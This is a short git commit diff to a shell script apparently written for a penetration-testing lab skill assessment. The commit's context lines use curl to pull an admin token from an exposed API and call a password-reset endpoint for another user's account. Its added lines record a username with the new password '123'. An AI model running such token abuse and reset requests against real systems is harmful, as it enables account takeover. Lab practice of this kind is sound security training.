d1cb0272b0a4d01d5e628c6984bbbba81d2066be
George Jeoung (Euyin) <justice2638@hotmail.com>
2025-06-25 03:35:28 +0000

    Update skill assessment.sh

--- skill assessment.sh
+++ skill assessment.sh
@@ -7,4 +7,6 @@ curl -v -X GET "http://94.237.55.43:50149/reset.php?uid=52&token=$ADMIN_TOKEN&pa
   ADMIN_TOKEN=$(curl -s "http://94.237.55.43:50149/api.php/token/52" | jq -r .token)
 echo "Admin Token: $ADMIN_TOKEN"
 
-
+ID :a.corrales
+PW : 123
+CHANGED
